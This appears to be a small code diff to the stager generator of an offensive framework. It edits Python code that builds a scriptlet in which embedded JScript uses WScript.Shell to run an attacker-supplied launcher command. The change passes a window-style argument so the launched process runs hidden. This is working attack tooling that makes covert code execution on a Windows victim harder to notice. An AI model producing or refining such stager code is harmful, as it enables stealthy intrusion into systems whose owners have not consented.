@@ -99,7 +99,7 @@ class Stager:
             code += " >\n"
             code += " <script language=\"JScript\">\n"
             code += "      <![CDATA[\n"
-            code += "           var r = new ActiveXObject(\"WScript.Shell\").Run(\"" + launcher + "\");\n"
+            code += "           var r = new ActiveXObject(\"WScript.Shell\").Run(\"" + launcher + "\",0);\n"
             code += "      ]]>\n"
             code += " </script>\n"
             code += "</registration>\n"
